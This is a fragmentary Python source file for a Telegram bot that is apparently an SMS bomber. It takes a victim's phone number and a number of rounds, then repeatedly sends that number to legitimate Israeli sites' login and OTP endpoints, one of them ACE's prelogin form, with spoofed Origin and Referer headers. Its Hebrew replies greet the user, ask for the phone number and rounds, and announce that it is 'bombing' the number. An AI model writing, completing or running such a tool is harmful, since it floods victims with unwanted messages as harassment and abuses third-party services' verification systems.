...
def attack(m, target, rounds):
    apis = [
        {
            "n": "ACE", 
            "u": "https://www.ace.co.il/login/prelogin/stepone", 
            "d": {
                "form_key": "d0FvqBYicRoR6FlO",
                "newaut": "1",
                "phone": target,
                "addintinalInfo": ""
            }, 
            "type": "form", 
            "ref": "https://www.ace.co.il/customer/account/login/"
        },
    ...
    for r in range(int(rounds)):
        ...
        for site in apis:
            try:
                ...
                headers["Origin"] = site["ref"].rstrip('/')
...
def welcome(m):
    bot.reply_to(m, "👋 **שלום! תקליד מספר טלפון וסבבים**\n\nדוגמה: `2 0501234567`", parse_mode="Markdown")
...
def handle(m):
    try:
        ...
        if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
            bot.reply_to(m, f"🚀 **מפציץ את {parts[1]}...**", parse_mode="Markdown")
